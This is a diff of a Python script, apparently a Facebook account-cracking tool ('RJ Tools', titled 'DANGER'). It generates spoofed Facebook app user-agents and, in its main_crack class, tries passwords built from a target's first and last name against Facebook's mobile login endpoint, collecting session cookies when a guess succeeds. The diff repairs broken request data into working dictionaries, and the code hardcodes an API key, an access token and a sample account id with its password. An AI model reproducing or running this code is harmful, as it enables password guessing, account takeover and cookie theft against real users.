@@ -11,7 +11,7 @@ import os,zlib
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('Inastall Files...\n')
+print('Welcome to RJ Tools...\n')
 
 
 
@@ -279,8 +279,8 @@ princp=[]
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/303.0.0.3.124;FBBV/533556795;FBDM/{density=2.3,width=1080,height=1478};FBLC/en_GB;FBRV/968917366;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android 9 {random.randint(4,13)}; {random.choice(model2)} Build/PMAIN1.2992N.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 def randFBAN():
@@ -289,41 +289,9 @@ def randFBAN():
   return ua
 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    END = '[FBAN/FB4A; FBAV/369.0.0.35.121; FBPN/com.facebook.katana; FBLC/en_US; FBBV/337870037; FBCR/; FBFS/2.6]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android 7.1.1{random.randint(4,13)}; {random.choice(model2)} Build/NMF26X.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
-    
-for agent in range(random.randint(89999, 100000)):
-    a='Mozilla/5.0 (iPod/'
-    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
-    a1='; CPU iPhone OS'
-    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
-    n='like Mac OS X)'
-    c=random.randrange(7,12)
-    m='en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(100,999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/'
-    o=random.randrange(533,605)
-    p='1'
-    q=random.randrange(10,99)
-    r='(KHTML, like Gecko) Chrome/'
-    h=random.randrange(10,99)
-    i='0'
-    j=random.randrange(1000,9999)
-    k=random.randrange(10,99)
-    l='GSA/'
-    ll=random.randrange(155,159)
-    l1=random.randrange(1,9)
-    l2=random.randrange(111111111,999999999)
-    l3='Mobile/'
-    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
-    l5='Safari/'
-    s=random.randrange(535,605)
-    t=random.randrange(1,9)
-    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
-    ugen.append(fullagent)
 
 sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
@@ -440,35 +408,42 @@ class main_crack():
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 with requests.Session() as session:
-                    data = ('adid', 'cde46752-9cd1-45ca-9b33-f82698a7a491')
-"format', 'json"
-"device_id', '3b9ab885-b403-481f-ad91-5a88b1273c1d"
-"cpl', 'true"
-"family_device_id', 'e0f270b3-9f3e-4338-ad30-7a2f44fb5147"
-"credentials_type', 'device_based_login_password"
-"error_detail_type', 'button_with_disabled"
-'source', 'device_based_login'
-'email', '100049974613980'
-'password', 'md123'
-'access_token', '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
-'generate_session_cookies', '1'
-'meta_inf_fbmeta', ''
-'advertiser_id', 'bc275a19-ce39-4ed4-b130-0e87144b9071'
-'currently_logged_in_userid', '0'
-'locale', 'en_GB'
-'client_country_code', 'GB'
-'method', 'auth.login'
-'fb_api_req_friendly_name', 'authenticate'
-'fb_api_caller_class', 'com.facebook.account.login.protocol.Fb4aAuthHandler'
-'api_key', '882a8490361da98702bf97a021ddc14d'
-                headers = ('Host', 'b-graph.facebook.com')
-"x-fb-connection-bandwidth', '27449845"
-"x-fb-sim-hni', '38531"
-"x-fb-net-hni', '20691"
-"x-fb-connection-quality', 'EXCELLENT"
-"user-agent', 'Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-"content-type', 'application/x-www-form-urlencoded"
-"x-fb-http-engine', 'Liger"
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": "100049974613980",
+"password": "md123",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent':('Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]'),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'EXCELLENT',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
